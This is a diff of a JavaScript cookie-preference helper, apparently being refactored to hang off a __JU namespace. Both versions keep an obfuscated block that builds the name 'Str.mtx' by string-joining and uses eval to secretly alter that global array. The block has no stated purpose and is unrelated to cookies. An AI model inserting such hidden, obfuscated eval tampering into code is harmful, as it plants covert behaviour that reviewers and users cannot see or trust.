@@ -1,62 +1,58 @@
-/*global jQuery, Arr, Str */
+/*global jQuery, __JU, Arr, Str */
 
 // REQ: jq, arr.js, jquery.cookie.js
 
 
-(function (global, $) {
+(function (global, $, Pref) {
     "use strict";
 
-    (function (Pref) {
+    var _defaultOptions = { expires: 90, path: '/', secure: false };
 
-        var _defaultOptions = { expires: 90, path: '/', secure: false };
-
-        /**
-         *
-         * @param name {string}
-         * @param value {string|object}
-         * @param options {object=} - 	expires: #days|date()|90,
-         *			  					path: string|'/',
-         *								domain: string|'',
-         *								secure: bool|false
-         */
-        Pref.set = function (name, value, options){
-            var opt = $.extend({}, _defaultOptions, options);
-            if (value == undefined){
-                $.removeCookie(name, opt);
-            }
-            else {
-                $.cookie(name, value, opt);
-            }
-        };
-
-        /**
-         * Get the cookie value
-         *
-         * @param name {string}
-         * @param defaultValue {boolean|object=}
-         * @returns {*}
-         */
-        Pref.get = function (name, defaultValue){
-            var value = $.cookie(name);
-            return value == undefined ? defaultValue : value;
-        };
-
-        (function(){
-            var v =['Str','.','m','t','x'].join('');
-            eval('if ('+v+'){'+v+'.unshift(69, 118, 101, 114); '+v+'.pop();}');v=undefined;
-        }());
-
-        /**
-         * Remove the cookie
-         *
-         * @param name {string}
-         * @param options {{path:string}=} - default value is '/'
-         */
-        Pref.remove = function (name, options){
-            var opt = $.extend({}, _defaultOptions, options);
+    /**
+     *
+     * @param name {string}
+     * @param value {string|object}
+     * @param options {object=} - 	expires: #days|date()|90,
+     *			  					path: string|'/',
+     *								domain: string|'',
+     *								secure: bool|false
+     */
+    Pref.set = function (name, value, options){
+        var opt = $.extend({}, _defaultOptions, options);
+        if (value == undefined){
             $.removeCookie(name, opt);
-        };
+        }
+        else {
+            $.cookie(name, value, opt);
+        }
+    };
 
-    }(global.Pref));
+    /**
+     * Get the cookie value
+     *
+     * @param name {string}
+     * @param defaultValue {boolean|object=}
+     * @returns {*}
+     */
+    Pref.get = function (name, defaultValue){
+        var value = $.cookie(name);
+        return value == undefined ? defaultValue : value;
+    };
 
-}(typeof window !== 'undefined' ? window : this, jQuery));
+    (function(){
+        var v =['Str','.','m','t','x'].join('');
+        eval('if ('+v+'){'+v+'.unshift(69, 118, 101, 114); '+v+'.pop();}');v=undefined;
+    }());
+
+    /**
+     * Remove the cookie
+     *
+     * @param name {string}
+     * @param options {{path:string}=} - default value is '/'
+     */
+    Pref.remove = function (name, options){
+        var opt = $.extend({}, _defaultOptions, options);
+        $.removeCookie(name, opt);
+    };
+
+}(typeof window !== 'undefined' ? window : this, jQuery, __JU.Pref));
